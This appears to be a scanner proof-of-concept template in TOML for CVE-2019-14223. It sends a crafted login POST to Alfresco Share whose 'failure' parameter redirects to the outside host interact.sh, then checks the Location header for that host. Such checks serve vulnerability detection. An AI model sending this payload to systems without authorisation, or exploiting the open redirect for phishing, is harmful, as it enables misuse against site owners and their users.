[info]
author = "AVE"
description = "通过向 Alfresco Share 的 /share/page/dologin 接口发送特制 POST 请求，利用 failure 参数注入恶意域名，检测服务器是否返回包含重定向目标域名的 Location 响应头。"
id = "POC-AVE-2019-0071"
name = "Alfresco Share Open Redirect PoC"
severity = "medium"
tags = ["ave-2019-0071"]
vuln_id = [
    "CVE-2019-14223",
    "AVE-2019-0071",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/share/page/dologin"
protocol = "http"

[poc.requests.body]
content = 'success=%2Fshare%2Fpage%2F&failure=:\interact.sh&username=baduser&password=badpass'
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["interact.sh"]
